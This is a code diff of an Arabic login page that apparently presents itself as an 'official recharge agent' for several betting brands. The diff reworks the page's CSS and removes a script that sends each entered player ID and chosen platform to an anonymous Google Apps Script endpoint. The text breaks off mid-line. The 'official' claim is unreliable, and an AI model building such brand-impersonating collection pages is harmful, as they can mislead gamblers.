@@ -3,224 +3,336 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>تسجيل</title>
+  <title>تسجيل الدخول - IdBet</title>
   <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet" />
   <style>
-    :root { --header-height:70px; --idbet-color:#e50914; }
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    :root {
+      --idbet-color: #e50914;
+      --input-bg: #fff;
+      --input-border: #ccc;
+      --input-focus-border: var(--idbet-color);
+      --icon-bg-selected: rgba(229, 9, 20, 0.15);
+      --icon-border-selected: var(--idbet-color);
+      --btn-bg: var(--idbet-color);
+      --btn-hover-bg: #b20710;
+      --btn-disabled-bg: #ccc;
+      --text-color: #333;
+      --error-color: #d32f2f;
+      --font-family: 'Tajawal', sans-serif;
+    }
+
+    /* Reset and base styles */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
     body {
-      font-family: 'Tajawal', sans-serif;
+      font-family: var(--font-family);
       background: #f5f5f5;
+      color: var(--text-color);
       direction: rtl;
-      color: #333;
-    }
-    header {
-      height: var(--header-height);
-      background: #fff;
+      min-height: 100vh;
       display: flex;
+      flex-direction: column;
       align-items: center;
-      padding: 0 24px;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, .05);
-      border-bottom: 1px solid #eee;
-    }
-    .header-brand {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      font-weight: 500;
-    }
-    .header-brand .idbet {
-      color: var(--idbet-color);
-      font-size: 1.2rem;
-      font-weight: bold;
-    }
-    .header-brand .separator {
-      color: #ccc;
-    }
-    .header-brand .slogan {
-      color: #555;
-      font-size: .95rem;
-    }
-    main {
-      display: flex;
-      justify-content: center;
       padding: 24px 16px;
     }
-    .login-box {
-      background: #fff;
-      padding: 28px 20px;
-      max-width: 420px;
+
+    header {
       width: 100%;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, .1);
-    }
-    .title-wrapper {
+      max-width: 440px;
+      background: #fff;
+      padding: 14px 24px;
+      margin-bottom: 32px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+      border-radius: 12px;
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 10px;
-      font-size: 1.35rem;
-      font-weight: bold;
-      margin-bottom: 16px;
+      font-weight: 600;
+      color: var(--idbet-color);
+      font-size: 1.25rem;
+      user-select: none;
+      position: relative;
     }
-    .step-box {
-      width: 36px;
-      height: 36px;
-      background: var(--idbet-color);
-      color: #fff;
-      border-radius: 50%;
+
+    header .separator {
+      color: #ccc;
+      font-weight: normal;
+    }
+
+    main {
+      width: 100%;
+      max-width: 440px;
+      background: #fff;
+      border-radius: 14px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.07);
+      padding: 32px 28px 40px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .title-wrapper {
       display: flex;
       align-items: center;
       justify-content: center;
+      gap: 14px;
+      font-size: 1.5rem;
+      font-weight: 700;
+      margin-bottom: 28px;
+      color: var(--idbet-color);
+      user-select: none;
     }
+
+    .step-box {
+      width: 40px;
+      height: 40px;
+      background: var(--idbet-color);
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      box-shadow: 0 4px 10px rgba(229, 9, 20, 0.5);
+      transition: box-shadow 0.3s ease;
+    }
+
     .step-box svg {
-      width: 20px;
-      height: 20px;
-    }
-    .input-group {
-      margin-bottom: 16px;
-    }
-    .input-group input {
-      width: 100%;
-      padding: 10px 40px 10px 10px;
-      font-size: .95rem;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      outline: none;
-    }
-    .info-icon {
       width: 22px;
       height: 22px;
-      border: 2px solid #666;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: bold;
+      fill: white;
+    }
+
+    .input-group {
+      width: 100%;
+      position: relative;
+      margin-bottom: 22px;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 14px 46px 14px 16px;
+      font-size: 1.1rem;
+      border-radius: 12px;
+      border: 2px solid var(--input-border);
+      background: var(--input-bg);
+      transition: border-color 0.3s ease, box-shadow 0.3s ease;
+      outline: none;
+      color: var(--text-color);
+      font-weight: 600;
+    }
+
+    .input-group input::placeholder {
+      color: #999;
+      font-weight: 400;
       font-size: 1rem;
-      cursor: help;
-      color: #666;
+    }
+
+    .input-group input:focus {
+      border-color: var(--input-focus-border);
+      box-shadow: 0 0 8px rgba(229, 9, 20, 0.4);
+      background: #fff;
+    }
+
+    .info-icon {
       position: absolute;
       top: 50%;
-      right: 10px;
+      right: 12px;
       transform: translateY(-50%);
-      transition: .3s;
+      width: 24px;
+      height: 24px;
+      border: 2px solid #666;
+      border-radius: 50%;
+      color: #666;
+      font-weight: 700;
+      font-size: 1.1rem;
+      cursor: help;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      transition: all 0.3s ease;
+      user-select: none;
+      background: #fff;
+      box-shadow: 0 0 6px rgba(0,0,0,0.05);
     }
+
     .info-icon:hover {
       border-color: var(--idbet-color);
-      background: rgba(229, 9, 20, .1);
       color: var(--idbet-color);
+      background: rgba(229, 9, 20, 0.1);
+      box-shadow: 0 0 8px rgba(229, 9, 20, 0.25);
     }
+
     .error-message {
-      font-size: .85rem;
+      color: var(--error-color);
+      font-size: 0.9rem;
+      font-weight: 600;
       margin-top: 6px;
       min-height: 22px;
       text-align: center;
+      user-select: none;
     }
+
     .platform-icons {
+      width: 100%;
       display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 12px;
-      justify-items: center;
-      margin: 12px 0 18px;
-      align-items: center;
+      grid-template-columns: repeat(auto-fit,minmax(96px,1fr));
+      gap: 14px;
+      margin: 20px 0 32px;
     }
+
     .icon {
-      position: relative;
-      width: 100px;
-      height: 100px;
-      border-radius: 14px;
+      cursor: pointer;
+      border-radius: 16px;
+      padding: 14px 10px 14px;
       background: #fff;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, .05);
+      border: 2px solid transparent;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.07);
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      padding: 12px;
-      transition: .3s;
-      border: 1px solid #eee;
-      cursor: pointer;
+      transition: all 0.3s ease;
+      user-select: none;
+      height: 110px;
     }
+
     .icon:hover {
+      box-shadow: 0 8px 24px rgba(229, 9, 20, 0.3);
       transform: translateY(-4px);
-      box-shadow: 0 6px 14px rgba(0, 0, 0, .1);
     }
+
     .icon.selected {
-      border-color: var(--idbet-color);
-      box-shadow: 0 0 10px rgba(229, 9, 20, .3);
+      border-color: var(--icon-border-selected);
+      background-color: var(--icon-bg-selected);
+      box-shadow: 0 8px 28px rgba(229, 9, 20, 0.6);
+      transform: translateY(-6px);
+      position: relative;
     }
+
     .icon.selected::after {
       content: "✓";
       position: absolute;
-      top: 6px;
-      left: 6px;
-      width: 20px;
-      height: 20px;
+      top: 8px;
+      left: 8px;
       background: var(--idbet-color);
-      color: #fff;
+      color: white;
+      font-size: 14px;
+      width: 24px;
+      height: 24px;
       border-radius: 50%;
-      font-size: 12px;
       display: flex;
-      align-items: center;
       justify-content: center;
+      align-items: center;
+      box-shadow: 0 0 8px rgba(229,9,20,0.8);
     }
+
     .icon img {
-      height: 50px;
-      max-width: 90%;
+      height: 52px;
+      max-width: 100%;
       object-fit: contain;
+      user-select: none;
+      pointer-events: none;
+      margin-bottom: 12px;
+      filter: drop-shadow(0 1px 1px rgba(0,0,0,0.07));
     }
+
     .icon-name {
-      margin-top: 8px;
-      font-weight: 600;
-      font-size: .85rem;
-      color: #333;
+      font-weight: 700;
+      font-size: 1rem;
+      color: var(--text-color);
       text-align: center;
+      user-select: none;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
     }
+
     .login-btn {
-      background: var(--idbet-color);
-      color: #fff;
-      font-weight: bold;
-      border: none;
-      padding: 10px 16px;
       width: 100%;
-      border-radius: 8px;
+      background: var(--btn-bg);
+      color: white;
+      font-weight: 700;
+      font-size: 1.1rem;
+      padding: 14px 0;
+      border: none;
+      border-radius: 14px;
       cursor: pointer;
-      transition: .3s;
+      box-shadow: 0 6px 20px rgba(229, 9, 20, 0.5);
+      transition: background-color 0.3s ease, box-shadow 0.3s ease;
+      user-select: none;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
     }
+
     .login-btn:disabled {
-      background: #ccc;
+      background: var(--btn-disabled-bg);
       cursor: not-allowed;
+      box-shadow: none;
+      color: #666;
     }
+
     .login-btn:hover:not(:disabled) {
-      background: #b20710;
+      background-color: var(--btn-hover-bg);
+      box-shadow: 0 8px 28px rgba(178, 7, 16, 0.8);
     }
+
     .btn-spinner {
-      width: 16px;
-      height: 16px;
-      border: 3px solid rgba(255, 255, 255, .6);
-      border-top: 3px solid #fff;
+      width: 18px;
+      height: 18px;
+      border: 3px solid rgba(255, 255, 255, 0.5);
+      border-top: 3px solid white;
       border-radius: 50%;
-      animation: spin .8s linear infinite;
-      margin-right: 6px;
-      vertical-align: middle;
+      animation: spin 0.8s linear infinite;
     }
+
     @keyframes spin {
-      to { transform: rotate(360deg); }
+      to {
+        transform: rotate(360deg);
+      }
     }
-    @media (max-width: 420px) {
+
+    /* Responsive */
+    @media (max-width: 460px) {
+      main {
+        padding: 24px 20px 36px;
+        max-width: 100%;
+        border-radius: 0;
+        box-shadow: none;
+      }
+
+      header {
+        max-width: 100%;
+        border-radius: 0;
+      }
+
       .platform-icons {
-        grid-template-columns: repeat(3, 1fr);
+        grid-template-columns: repeat(auto-fit,minmax(80px,1fr));
         gap: 10px;
       }
+
       .icon {
-        width: 90px;
         height: 90px;
-        padding: 10px;
+        padding: 12px 8px 12px;
       }
+
       .icon img {
-        height: 40px;
+        height: 42px;
+        margin-bottom: 10px;
       }
+
       .icon-name {
-        font-size: 0.8rem;
+        font-size: 0.9rem;
+      }
+
+      .login-btn {
+        font-size: 1rem;
+        padding: 12px 0;
       }
     }
   </style>
@@ -228,128 +340,28 @@
 <body>
 
 <header>
-  <div class="header-brand">
-    <span class="idbet">Idbet</span><span class="separator">|</span><span class="slogan">وكيل الشحن الرسمي</span>
-  </div>
+  <span class="idbet">Idbet</span>
+  <span class="separator">|</span>
+  <span class="slogan">وكيل الشحن الرسمي</span>
 </header>
 
 <main>
-  <section class="login-box">
-    <div class="title-wrapper">
-      <div class="step-box">
-        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="white" viewBox="0 0 24 24">
+  <section class="login-box" aria-label="نموذج تسجيل الدخول">
+    <div class="title-wrapper" aria-live="polite" aria-atomic="true">
+      <div class="step-box" aria-hidden="true">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white" aria-hidden="true" focusable="false">
           <path d="M12 4V1L8 5l4 4V6c3.3 0 6 2.7 6 6 0 .7-.1 1.4-.4 2l1.5 1.5c.6-1.1.9-2.4.9-3.5 0-4.4-3.6-8-8-8zm0 16v3l4-4-4-4v3c-3.3 0-6-2.7-6-6 0-.7.1-1.4.4-2L4.9 9.5c-.6 1.1-.9 2.4-.9 3.5 0 4.4 3.6 8 8 8z"/>
         </svg>
       </div>
-      <h2>تسجيل</h2>
+      <h2>تسجيل الدخول</h2>
     </div>
 
     <div class="input-group">
-      <div style="position: relative;">
-        <input id="player-id-1" type="text" maxlength="10" placeholder="معرّف اللاعب" />
-        <span class="info-icon" title="رقم مكوَّن من 10 أرقام">?</span>
-      </div>
-      <div class="error-message" id="error-message"></div>
+      <input id="player-id-1" name="player-id" type="text" maxlength="10" placeholder="معرّف اللاعب" aria-describedby="info-player-id" aria-invalid="false" required autocomplete="off" />
+      <span class="info-icon" id="info-player-id" title="رقم مكوَّن من 10 أرقام" aria-label="معلومات">?</span>
+      <div class="error-message" id="error-message" role="alert" aria-live="assertive"></div>
     </div>
 
-    <div class="platform-icons" id="platforms">
-      <div class="icon" data-name="LineBet"><img src="https://i.postimg.cc/x1p0KbfL/cropped-linebet-logo.png" /><div class="icon-name">LineBet</div></div>
-      <div class="icon" data-name="MegaPari"><img src="https://i.postimg.cc/3RRJsCtS/Wh7-Gu-Bom34-Xq4-Bu-QN5n-Qlj-XPXf-V6-CZothm-Lsl6a-S.webp" /><div class="icon-name">MegaPari</div></div>
-      <div class="icon" data-name="Melbet"><img src="https://i.postimg.cc/wjCr86FS/melbet.png" /><div class="icon-name">Melbet</div></div>
-      <div class="icon" data-name="Gooobet"><img src="https://i.postimg.cc/NMyXmrWn/c943dc665c7e8926e8fb15cadd4e1eee.jpg" /><div class="icon-name">Gooobet</div></div>
-      <div class="icon" data-name="1xBet"><img src="https://i.postimg.cc/PrMCL4Cx/1-XBet-Casino-1200x900-1.png" /><div class="icon-name">1xBet</div></div>
-    </div>
-
-    <button class="login-btn" id="login-btn" disabled>تسجيل الدخول</button>
-  </section>
-</main>
-
-<script>
-  const input = document.getElementById('player-id-1');
-  const errMsg = document.getElementById('error-message');
-  const btn = document.getElementById('login-btn');
-  const icons = document.querySelectorAll('.icon');
-  let platform = null;
-
-  const repReg = /^(\d)\1{9}$/;
-
-  input.addEventListener('keydown', e => {
-    const ok = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'];
-    if (!ok.includes(e.key) && !/^\d$/.test(e.key)) e.preventDefault();
-  });
-
-  input.addEventListener('input', validate);
-
-  icons.forEach(icon => {
-    icon.addEventListener('click', () => {
-      icons.forEach(i => i.classList.remove('selected'));
-      icon.classList.add('selected');
-      platform = icon.dataset.name;
-      validate();
-    });
-  });
-
-  function validate() {
-    const val = input.value.replace(/\D/g, '');
-    input.value = val;
-    errMsg.textContent = '';
-    btn.disabled = true;
-
-    if (val.length !== 10) {
-      errMsg.textContent = 'يجب أن يحتوي المعرّف على 10 أرقام.';
-      return;
-    }
-
-    if (repReg.test(val)) {
-      errMsg.textContent = 'المعرّف غير صالح (أرقام مكررة).';
-      return;
-    }
-
-    if (!platform) {
-      errMsg.textContent = 'يرجى اختيار المنصة.';
-      return;
-    }
-
-    btn.disabled = false;
-  }
-
-  btn.addEventListener('click', async () => {
-    btn.innerHTML = '<span class="btn-spinner"></span> جارٍ الإرسال...';
-    btn.disabled = true;
-
-    const payload = {
-      userId: input.value,
-      platform: platform
-    };
-
-    try {
-      await fetch('https://script.google.com/macros/s/AKfycbzQXqfYK3rzSSR-ZKYDxsa1iqTQUpfflHnDZQVnU3hKxNoLG0j3gPO0KIijH5YZelQg3A/exec', {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-
-      setTimeout(() => {
-        localStorage.setItem('userId', input.value);
-        window.location.href = 'home.html';
-      }, 1200);
-    } catch (err) {
-      errMsg.textContent = 'حدث خطأ أثناء الإرسال، حاول مجددًا.';
-      btn.innerHTML = 'تسجيل الدخول';
-      btn.disabled = false;
-    }
-  });
-
-  window.addEventListener('pageshow', () => {
-    btn.disabled = true;
-    btn.innerHTML = 'تسجيل الدخول';
-    errMsg.textContent = '';
-    input.value = '';
-    platform = null;
-    icons.forEach(i => i.classList.remove('selected'));
-  });
-</script>
-
-</body>
-</html>
+    <div class="platform-icons" id="platforms" role="list" aria-label="منصات اللعب المتاحة">
+      <div class="icon" role="listitem" tabindex="0" data-name="LineBet" aria-pressed="false" aria-label="اختيار منصة LineBet">
+        <img src="https://i.postimg.cc/x1p
